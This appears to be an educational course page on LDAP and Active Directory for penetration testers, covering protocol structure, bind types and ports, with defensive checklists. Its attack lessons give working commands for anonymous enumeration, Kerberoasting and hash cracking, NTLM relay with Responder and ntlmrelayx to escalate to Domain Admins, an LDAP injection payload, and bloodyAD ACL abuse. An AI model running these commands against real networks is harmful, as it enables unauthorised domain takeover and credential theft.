Lesson 01

What is LDAP?

Lightweight Directory Access Protocol — the query language that powers every Active Directory operation, from logins to BloodHound enumeration.

📖
Definition

LDAP (Lightweight Directory Access Protocol) is an open, vendor-neutral application protocol for accessing and maintaining distributed directory information services over an IP network. In the context of Windows, it is the primary protocol used to communicate with Active Directory — enabling applications to search for users, authenticate accounts, read group memberships, and modify directory objects.

RFC 4511 Port 389 X.500 Derived Client-Server 1993 · Univ. of Michigan
💡
Why LDAP Was Created
🔥

The Problem — DAP Was Too Heavy

The original X.500 Directory Access Protocol required the full OSI network stack. In 1993, most systems only had TCP/IP. DAP was slow, complex, and resource-intensive. Real-world deployment was nearly impossible.

✅

The Solution — LDAP v1 (1993)

Tim Howes, Mark Smith, and Gordon Good at UMich created a lightweight TCP/IP gateway to X.500. LDAPv3 (RFC 2251, 1997) added TLS, SASL, and referrals. Microsoft adopted LDAPv3 as the core AD protocol in Windows 2000.

🌍
Real-World Analogy
🏨
LDAP is like a Hotel's Concierge Desk

Imagine a huge hotel (Active Directory). The concierge desk (LDAP) holds information about every guest — name, room number, which areas they can access, amenities included. When you ask "Is Alice checked in? What floor?" the concierge looks it up and tells you. When your keycard is swiped (login), the system queries the concierge. When the manager changes your access level (Modify), the concierge updates the record. LDAP is that concierge — the standardised way to query and update the hotel's entire guest database.

LDAP Architecture & the Directory Tree

How LDAP is structured — the client-server model, Directory Information Tree, Schema, and how data flows from query to response.

📊
LDAP Client-Server Architecture
LDAP Client-Server Architecture — Request flows left to right, Directory Information Tree stored on DC
📐
Schema — The Blueprint
Defines every allowed object type and attribute

Every LDAP entry has an objectClass attribute defining its type. Key classes in AD:

user — Human accounts and service accounts. Inherits from organizationalPerson → person → top.

computer — Machine accounts. Inherits from user. Account name ends in $.

group — Security and distribution groups. Has member and memberOf attributes.

organizationalUnit — Container for organizing objects. GPOs link here.

groupPolicyContainer — Represents a GPO in AD.

In attack queries: (objectClass=user) returns all user objects. (objectClass=computer) returns all machine accounts.

sAMAccountName — Pre-Windows 2000 login name. Used in most auth. Critical for attacks.

userPrincipalName — UPN format login: alice@corp.local. Used in Kerberos.

memberOf — List of group DNs the object belongs to. Core for privilege analysis.

servicePrincipalName — If set on a user account → Kerberoastable. High-value target.

userAccountControl — Bitmask encoding account state. Bit 0x400000 = no Kerberos pre-auth → AS-REP Roastable.

pwdLastSet — When password was last changed. Value 0 = must change at next login.

adminCount — Value 1 = account is/was in a privileged group. High-value target.

description — Sometimes contains passwords in legacy environments!

msDS-AllowedToDelegateTo — Constrained delegation targets. Key for delegation attacks.

RootDSE is a special entry at the root of the LDAP tree (empty DN). It exposes server capabilities and domain info without authentication.

Query it: ldapsearch -x -H ldap://DC01 -b "" -s base "*" +

Key attributes returned: defaultNamingContext (e.g. DC=corp,DC=local), dnsHostName (DC01.corp.local), domainFunctionality, forestFunctionality, supportedSASLMechanisms.

Attack use: RootDSE enumeration requires no credentials — it reveals domain name, DC hostname, functional level, and supported auth mechanisms. Always query RootDSE first in a pentest.

🎤
Interview Questions
Q1
What is the difference between the LDAP schema and the DIT?
The Schema defines the rules — what object classes exist, what attributes they have, which are mandatory vs optional, and data types. The Directory Information Tree (DIT) is the actual data — the tree of entries (users, groups, computers) conforming to those rules. Schema is the blueprint; DIT is the building.
Q2
What can an attacker learn from querying RootDSE?
Without any credentials, RootDSE reveals: the domain name (defaultNamingContext), the DC's hostname, domain and forest functional levels (indicating patching maturity), and supported SASL mechanisms (revealing what authentication methods are available). This is an unauthenticated information disclosure that helps plan subsequent attacks.

💡

Base DN — Where to Start Searching

The Base DN tells LDAP where in the tree to begin a search. For a domain-wide search, use the domain root: DC=corp,DC=local. To search only within a specific OU: OU=Engineering,DC=corp,DC=local. Narrowing the Base DN speeds up queries and reduces noise.

🌐

Naming Context — The Domain Partitions

Active Directory has multiple naming contexts (partitions): the Domain NC (all objects in the domain), the Configuration NC (sites, services, replication topology), and the Schema NC (attribute/class definitions). Global Catalog holds partial replicas of all domain NCs in the forest.

Bind Types — 4 Ways to Authenticate

Anonymous Bind allows connection to LDAP without supplying any credentials. If enabled, an attacker can enumerate the entire directory structure without a single valid account.

Test for it: ldapsearch -x -H ldap://DC01 -b "DC=corp,DC=local" "(objectClass=*)"

Risk: Critical. Disabled by default in modern Windows Server, but sometimes re-enabled for legacy applications.

Remediation: Ensure LDAP Server Integrity is set to Require in Group Policy and verify anonymous LDAP access is blocked.

Simple Bind sends credentials directly — either as a Distinguished Name + password, or as a UPN (user@domain.com) + password. Over port 389, these travel in cleartext.

Example: ldapsearch -x -H ldap://DC01 -D "alice@corp.local" -W -b "DC=corp,DC=local"

Risk: Credentials visible on the wire if captured via Wireshark/tcpdump. Use LDAPS (port 636) with Simple Bind to encrypt.

Attack: Password spray via LDAP — try a common password against all accounts. Less noisy than Kerberos spraying in some environments.

SASL (Simple Authentication and Security Layer) is a framework for plugging different authentication mechanisms into LDAP. In Active Directory, SASL mechanisms include NTLM, Kerberos (GSS-API/SPNEGO), and DIGEST-MD5.

Kerberos SASL: The client presents a Kerberos service ticket for the LDAP service (SPN: ldap/DC01.corp.local). No password sent on the wire. Most secure.

NTLM SASL: Three-message challenge-response. Vulnerable to NTLM relay if LDAP signing is not enforced.

Attack: NTLM Relay to LDAP — capture authentication from a victim, relay to DC's LDAP service, perform privileged write operations (e.g., add shadow credentials, set RBCD).

LDAPS wraps the entire LDAP session in a TLS tunnel. Connects to port 636 (or 3269 for Global Catalog). The TLS handshake occurs before any LDAP messages are sent.

Benefits: Protects credentials from eavesdropping. Provides server authentication via certificate.

StartTLS is an alternative — connect to port 389, then send an Extended Operation to upgrade the connection to TLS in-place.

Gotcha for defenders: Simply enabling LDAPS isn't enough — you must also enforce LDAP Channel Binding to prevent relay attacks against LDAPS connections.

👹 Attacker's Perspective
  • Try Anonymous Bind first — if successful, no creds needed for full enumeration
  • Use Simple Bind over plaintext LDAP for credential capture via Wireshark
  • NTLM relay to LDAP — capture challenge-response, relay to write-to-AD operations
  • Password spray via LDAP Bind (less likely to trigger lockout than other methods)
  • Use bloodyAD for post-exploitation LDAP writes (add to groups, set delegation)
🛡️ Defender's Perspective
  • Disable Anonymous Bind — set via Group Policy: Network Security: Restrict NTLM
  • Enforce LDAP Signing (require, not just negotiate) across all DCs
  • Enable LDAP Channel Binding to prevent LDAPS relay attacks
  • Monitor Event ID 2889 (unsigned LDAP connections) and 2887 (anonymous binds)
  • Require LDAPS-only for sensitive applications — retire plain port 389 where possible

Lesson 25

LDAP Ports — The Four You Must Know

Asked in every security interview. Critical for Nmap enumeration and firewall rules.

389
Standard LDAP
Plain TCP. All communications unencrypted. Credentials visible in Wireshark. Default for all LDAP clients.
⚠ Unencrypted
636
LDAPS (TLS)
LDAP over SSL/TLS. Entire session encrypted. Use this for Simple Bind to protect credentials. Requires valid certificate.
✅ Encrypted
3268
Global Catalog LDAP
Forest-wide unencrypted LDAP. Queries here return partial attributes from ALL domains in forest. Used by Outlook for address book lookup.
🌐 Forest-Wide
3269
Global Catalog LDAPS
Encrypted forest-wide LDAP. Same as 3268 but with TLS. Preferred for cross-domain application queries.
✅ GC + Encrypted
🚩 HTB TipNmap LDAP Reconnaissance

On any AD machine, start with LDAP port scanning and NSE enumeration:

▶nmap -p 389,636,3268,3269 --open -sV TARGET — Confirm LDAP service versions
▶nmap -p 389 --script ldap-rootdse TARGET — Enumerate domain info without credentials
▶nmap -p 389 --script ldap-search --script-args 'ldap.base="DC=corp,DC=local"' TARGET
▶Port 3268 open = Global Catalog = you can enumerate the entire forest, not just one domain

Lessons 33 – 34

LDAP Attacks & Exploitation

Five real-world attack techniques targeting LDAP — from passive enumeration to active exploitation using NTLM relay.

Scenario: LDAP Anonymous Bind or RootDSE accessible. No credentials required.

ldapsearch -x -H ldap://10.10.10.161 -b "" -s base "*" + — Query RootDSE for domain info

ldapsearch -x -H ldap://10.10.10.161 -b "DC=htb,DC=local" "(objectClass=*)" — Full anonymous enumeration if enabled

Output reveals: all users, computers, groups, OUs, GPO names, and ACL structure — enough to plan targeted attacks.

Goal: Find accounts with SPN set (Kerberoastable) using LDAP Search.

ldapsearch -x -H ldap://DC01 -D "alice@corp.local" -W -b "DC=corp,DC=local" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName

Or via NetExec: nxc ldap DC01 -u alice -p Pass123 --kerberoasting out.txt

Next step: Request TGS for each SPN, crack offline with hashcat: hashcat -m 13100 out.txt wordlist.txt

Vulnerable code (pseudocode):
filter = "(uid=" + userInput + ")"

Injection payload: Input *)(&(objectClass=* → crafted filter becomes (uid=*)(&(objectClass=*)(anything...))

Effects: Authentication bypass, return all users instead of one, exfiltrate data, modify query logic.

Prevention: Whitelist input characters, use parameterized LDAP queries, escape special characters: * ( ) \ / NUL

Prerequisites: LDAP signing not enforced, ability to capture NTLM authentication (e.g., via Responder).

Attack flow:

1. responder -I eth0 -rdw — capture NTLM hashes on the network

2. ntlmrelayx.py -t ldap://DC01 --escalate-user lowpriv — relay to LDAP

3. ntlmrelayx adds lowpriv to Domain Admins (if relayed account has write rights)

Alternative — Resource-Based Constrained Delegation attack via relay: ntlmrelayx.py -t ldap://DC01 --delegate-access

Prevention: Enable LDAP Signing (required, not negotiate), enable LDAP Channel Binding.

Scenario: BloodHound shows your user has GenericWrite over another account. You can modify LDAP attributes on that account.

Options:

• Set servicePrincipalName → makes account Kerberoastable → request TGS → crack

• Set msDS-KeyCredentialLink (Shadow Credentials) → authenticate as that account

• Set scriptPath → execute code at logon

Tool: bloodyAD -u alice -p Pass123 --host DC01 setAttribute "CN=bob,OU=Users,DC=corp,DC=local" servicePrincipalName 'http/evil'

Prevention: Review and clean up over-permissive ACLs — run BloodHound regularly from a defender perspective.

👹 Attack Chain Summary
  • Step 1: Port scan → confirm LDAP (389/3268 open)
  • Step 2: RootDSE → get domain name without credentials
  • Step 3: Anonymous Bind or credential-based Bind
  • Step 4: Enumerate SPNs → Kerberoast; check UAC bits → AS-REP Roast
  • Step 5: BloodHound collection → find shortest path to DA
  • Step 6: ACL abuse via LDAP Modify → escalate privileges
🛡️ Defence Checklist
  • Enforce LDAP Signing and Channel Binding (GPO + registry)
  • Disable Anonymous Bind on all DCs
  • Monitor Event 4662 for AD object access and 4768/4769 for ticket requests
  • Use Microsoft Defender for Identity — detects LDAP recon automatically
  • Review ACLs quarterly with BloodHound in "defender mode"
  • Alert on bulk LDAP queries (>500 objects) from workstations

Lesson 35

LDAP Tools Reference

Every tool a penetration tester or defender needs for LDAP interaction — with example commands and what they look like under the hood.

🔍
ldapsearch
Linux CLI · ldap-utils package

The gold standard for manual LDAP queries. Fully controls every parameter — Base DN, scope, filter, attributes. Low-level and verbose output shows exactly what the server returns.

ldapsearch -x -H ldap://DC01 -D "alice@corp.local" -W \ -b "DC=corp,DC=local" \ "(&(objectClass=user)(servicePrincipalName=*))" \ sAMAccountName servicePrincipalName description
ldapsearch -x -H ldap://DC01 -b "" -s base "*" + # RootDSE (no auth!)
⚡
NetExec (nxc)
Python · Successor to CrackMapExec

Swiss army knife for AD pentesting. Wraps common LDAP queries into convenient flags. Excellent for quick wins and bulk enumeration across multiple targets.

nxc ldap DC01 -u alice -p 'Pass123' --users # All domain users nxc ldap DC01 -u alice -p 'Pass123' --groups # All groups nxc ldap DC01 -u alice -p 'Pass123' --kerberoasting out.txt nxc ldap DC01 -u alice -p 'Pass123' --asreproast out.txt nxc ldap DC01 -u alice -p 'Pass123' --trusted-for-delegation nxc ldap DC01 -u alice -p 'Pass123' -M get-desc-users # Users with descriptions
🩸
BloodHound + SharpHound
C# Collector + Neo4j Graph

The pentest game-changer. SharpHound fires ~25 LDAP queries to collect users, groups, computers, GPOs, sessions, and ACL data. BloodHound visualises the graph and finds attack paths automatically.

./SharpHound.exe -c All --zipfilename loot.zip # On Windows python bloodhound.py -u alice -p 'Pass' -d corp.local -dc DC01 -c All # Python version # BloodHound Cypher queries: # Shortest path to Domain Admins from current user # Find all Kerberoastable users with paths to high-value targets # Find users with DCSync rights
🩸
bloodyAD
Python · AD Modification over LDAP

Post-exploitation tool for writing to AD via LDAP/Kerberos. Useful when you have write permissions but no GUI/RDP. Operates without Mimikatz.

python bloodyAD.py --host DC01 -d corp.local -u alice -p 'Pass' \ addObjectToGroup alice "Domain Admins" # Add to group python bloodyAD.py --host DC01 -d corp.local -u alice -p 'Pass' \ setAttribute "CN=bob,OU=Users,DC=corp,DC=local" \ servicePrincipalName 'http/evil.corp.local' # Set SPN → Kerberoast bob
